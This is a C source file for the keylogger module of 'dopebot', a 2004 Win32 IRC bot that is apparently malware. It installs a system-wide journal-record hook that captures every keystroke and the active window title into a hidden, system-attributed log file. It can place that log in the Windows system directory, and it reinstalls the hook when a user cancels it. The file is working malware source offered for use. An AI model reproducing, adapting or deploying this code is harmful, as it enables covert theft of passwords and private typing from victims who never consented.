/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_KEYLOGGER
#include "bot.h"

//Argh, Globals Again!
char szFile[32], szLogText[512];
bool bRunning = FALSE;
HANDLE hCapFile = NULL, hKeyCapThread = NULL, hFile;
HHOOK hLogHook = NULL;
HWND hLastFocus = NULL;

//Journal Hook Thread
LRESULT CALLBACK journalrecord(int Code, WPARAM wParam, LPARAM lParam)
{
	BYTE btKeyBuff[MEDBUF];
	char szBuffer[MEDBUF], szTitle[MEDBUF];
	DWORD dwBytes = 0, dwCount;
	EVENTMSG *pEvent = (EVENTMSG *)lParam;
	HWND hFocus = GetActiveWindow();
	int iKey, iScan, iCount, iCharCount;
	WORD wrChar;

#ifndef NO_DEBUG
		printf("[DEBUG] Staring journalrecord thread, journalrecord()...\n");
#endif

	if (Code < 0) return CallNextHookEx(hLogHook, Code, wParam, lParam);
	if (Code == HC_ACTION)
	{
		if (pEvent->message == WM_KEYDOWN)
		{
				iKey = LOBYTE(pEvent->paramL);
				iScan = HIBYTE(pEvent->paramL);
				iScan <<= 16;
			if (hLastFocus != hFocus) 
			{
					iCount = GetWindowText(hFocus, szTitle, 256);
				if(iCount > 0) 
				{
						wsprintf(szBuffer, "\r\n[ %s ]\r\n", szTitle);
						WriteFile(hCapFile, szBuffer, lstrlen(szBuffer), &dwBytes, NULL);
				}
						hLastFocus = hFocus;
			}
				dwCount = GetKeyNameText(iScan, szBuffer, 256);	
			if (dwCount) 
			{
				if (iKey == VK_SPACE) 
				{
						szBuffer[0] = ' ';
						szBuffer[1] = '\0';
						dwCount = 1;
				}
				if (dwCount == 1) 
				{
						GetKeyboardState(btKeyBuff);
						iCharCount = ToAscii(iKey, iScan, btKeyBuff, &wrChar, 0);
					if (iCharCount > 0) WriteFile(hCapFile, &wrChar, iCharCount, &dwBytes, NULL);				
				} 
				else 
				{
						WriteFile(hCapFile, "[", 1, &dwBytes, NULL);
						WriteFile(hCapFile, szBuffer, dwCount, &dwBytes, NULL);
						WriteFile(hCapFile, "]", 1 , &dwBytes, NULL);
					if (iKey == VK_RETURN) WriteFile(hCapFile, "\r\n", 2, &dwBytes, NULL);
				}
			}			
		}
	
	}
		return CallNextHookEx(hLogHook, Code, wParam,  lParam);
}

//Keylogger
DWORD WINAPI keylogger(LPVOID param)
{
	BOOL bLogging = FALSE;
	BYTE btKeyState[MEDBUF];
	HMODULE hModule = NULL;
	int i;
	MSG mgMsg;
	for (i = 0; i < 256; i++) btKeyState[i] = 0;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting keylogger thread, keylogger()...\n");
#endif

		hLastFocus = NULL;
		hModule = GetModuleHandle(NULL);
		hCapFile = CreateFile(szFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
	if (hCapFile == INVALID_HANDLE_VALUE) return 0;
		SetFilePointer(hCapFile, 0, NULL, FILE_END);
		hLogHook = SetWindowsHookEx(WH_JOURNALRECORD, journalrecord, hModule, 0);
	if (hLogHook == NULL) 
	{
			CloseHandle(hCapFile);
			hCapFile = NULL;
			return 0;
	}
		bLogging = TRUE;
	while (bLogging) 
	{
		while(PeekMessage(&mgMsg, NULL, 0, 0, PM_NOREMOVE)) 
		{
				GetMessage(&mgMsg, NULL, 0, 0);
			if (mgMsg.message == WM_CANCELJOURNAL) 
			{
					SetKeyboardState(btKeyState);
					hLogHook = SetWindowsHookEx(WH_JOURNALRECORD, journalrecord,hModule, 0);
				if (hLogHook == NULL) 
				{
						CloseHandle(hCapFile);
						hCapFile = NULL;
						return 0;
				}
			} 
			else DispatchMessage(&mgMsg);
		}
			Sleep(10);
	}
		UnhookWindowsHookEx(hLogHook);
		CloseHandle(hCapFile);
		hCapFile = NULL;
		hKeyCapThread = NULL;
		return 0;
}

//Start Keylogger
bool keylogger_start(char *szFileName)
{
	DWORD dwID;
	if (bRunning) return FALSE;
		sprintf(szFile, szFileName);

#ifndef NO_DEBUG
		printf("[DEBUG] Starting keylogger, keylogger_start()...\n");
#endif

#ifndef NO_FWB
	if (is_fwb())
	{
		char szSysDir[MAX_PATH];
			GetSystemDirectory(szSysDir, sizeof(szSysDir));
			sprintf(szFile, "%s\\%s", szSysDir, szFileName);
	}
#endif

		hFile = CreateThread(NULL, 0, &keylogger, NULL, 0, &dwID);
		bRunning = TRUE;
		return TRUE;
}

//Stop Keylogger
bool keylogger_stop()
{
	if (hCapFile == NULL) return FALSE;

#ifndef NO_DEBUG
		printf("[DEBUG] Stopping keylogger, keylogger_stop()...\n");
#endif

		UnhookWindowsHookEx(hLogHook);
		TerminateThread(hFile, 0);
		CloseHandle(hFile);
		CloseHandle(hCapFile);
		hCapFile = NULL;
		hKeyCapThread = NULL;
		bRunning = FALSE;
		return TRUE;
}
#endif